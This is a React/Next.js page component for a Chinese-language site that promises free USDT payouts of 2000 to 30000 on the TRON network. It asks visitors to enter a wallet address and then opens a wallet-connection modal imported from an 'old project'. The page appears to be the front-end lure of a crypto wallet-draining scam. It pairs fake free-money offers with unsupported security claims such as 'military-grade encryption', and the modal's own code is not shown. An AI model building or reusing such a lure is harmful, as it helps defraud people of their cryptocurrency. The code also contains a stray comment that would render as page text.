"use client";


import { useState } from "react";


import WalletModal from "./components/WalletModal";





export default function Home(){



const [amount,setAmount] = useState("2000");


const [inputAddress,setInputAddress] = useState("");


const [msg,setMsg] = useState("");



const [walletOpen,setWalletOpen] = useState(false);







// ===============================
// 绑定按钮
// ===============================


function bindWallet(){



if(!inputAddress.trim()){


setMsg(
"请输入您的TRON钱包地址"
);


return;


}





const tronReg =
/^T[1-9A-HJ-NP-Za-km-z]{33}$/;



if(!tronReg.test(inputAddress)){


setMsg(
"请输入正确的TRON钱包地址"
);


return;


}





// 打开旧项目方式的钱包选择窗口


setWalletOpen(true);



}








return (

<main className="min-h-screen bg-[#030817] text-white px-5 py-6">



{/* Header */}


<div className="flex justify-between items-center">



<div className="flex items-center gap-3">



<div className="w-14 h-14 rounded-2xl bg-gradient-to-br from-cyan-300 to-blue-500 flex items-center justify-center text-black font-black text-xl">

KK

</div>





<div>


<div className="font-bold text-lg">

自助领取USDT

</div>



<div className="text-xs text-gray-400">

Secure Web3 Service

</div>



</div>



</div>






<div className="rounded-full border border-white/10 px-4 py-2 text-sm">

🟢 TRON Network

</div>



</div>






{/* 标题 */}


<div className="text-center mt-20">



<div className="inline-block rounded-full border border-cyan-400/30 px-5 py-2 text-cyan-300">

⚡ 快速 · 安全 · 专业

</div>





<h1 className="text-4xl font-bold mt-8">

提取地址绑定

</h1>





<p className="text-gray-400 mt-5 leading-8">

绑定您的TRON钱包地址

<br/>

用于USDT提取

</p>




</div>






{/* 金额区域 */}


<div className="mt-12">


<h2 className="font-bold text-lg mb-5">

选择提取金额

</h2>





<label

className={`block rounded-3xl border p-6 mb-4 cursor-pointer ${
amount==="2000"

?

"border-cyan-400 bg-cyan-400/10"

:

"border-white/10 bg-white/5"

}`}


>


<input

type="radio"

checked={amount==="2000"}

onChange={()=>setAmount("2000")}

className="hidden"

/>





<div className="text-cyan-300 text-sm">

⭐ 新用户测试专用

</div>




<div className="text-4xl font-bold mt-3">

2000

<span className="text-xl text-cyan-300 ml-2">

USDT

</span>

</div>



</label>





<div className="grid grid-cols-2 gap-4">



{
["10000","20000","30000"].map(item=>(



<label

key={item}

className={`rounded-2xl border py-5 text-center cursor-pointer ${
amount===item

?

"border-cyan-400 bg-cyan-400/20 text-cyan-300"

:

"border-white/10 bg-white/5"

}

${item==="30000"?"col-span-2":""}

`}

>


<input

type="radio"

checked={amount===item}

onChange={()=>setAmount(item)}

className="hidden"

/>



{item} USDT



</label>



))


}



</div>




<div className="text-center mt-5 text-sm text-gray-400">


当前选择：

<span className="text-cyan-300 ml-2">

{amount} USDT

</span>



</div>




</div>
// ===============================
// 地址绑定区域
// ===============================


<div className="mt-12">


<h2 className="text-xl font-bold mb-5">

输入接收地址

</h2>





<div className="rounded-3xl border border-white/10 bg-white/5 p-5">



<div className="text-sm text-gray-400 mb-3">

绑定地址

</div>





<input


value={inputAddress}


onChange={(e)=>setInputAddress(e.target.value)}


placeholder="请输入您的TRON钱包地址"


className="w-full bg-transparent outline-none text-white placeholder-gray-500"




/>



</div>






<button


onClick={bindWallet}


className="w-full mt-6 py-5 rounded-3xl bg-gradient-to-r from-cyan-300 to-blue-500 text-black font-bold text-lg"


>


立即绑定


</button>





{
msg && (


<div className="text-center text-cyan-300 mt-5 text-sm">

{msg}

</div>


)

}



</div>








{/* 安全说明 */}


<div className="mt-12 space-y-4">





<div className="rounded-2xl border border-white/10 bg-white/5 p-5">

🛡️ 军级加密技术，确保地址绑定安全

</div>





<div className="rounded-2xl border border-white/10 bg-white/5 p-5">

⚡ 毫秒级处理速度，及时完成绑定

</div>





<div className="rounded-2xl border border-white/10 bg-white/5 p-5">

🛡️ 专业风控团队，24小时安全保障

</div>






</div>






{/* Footer */}


<div className="text-center mt-20 pb-10">



<div className="text-3xl font-bold text-cyan-300">

KK

</div>



<div className="text-gray-500 mt-2">

Secure Web3 Infrastructure

</div>



</div>





{/* ===============================

旧项目钱包连接组件

=============================== */}



<WalletModal


open={walletOpen}



onClose={()=>setWalletOpen(false)}



onConnected={(data: any)=>{


setMsg(

"钱包连接成功：" + data.address

);


}}



onError={(error: string)=>{


setMsg(error);


}}


/>







</main>


);



}
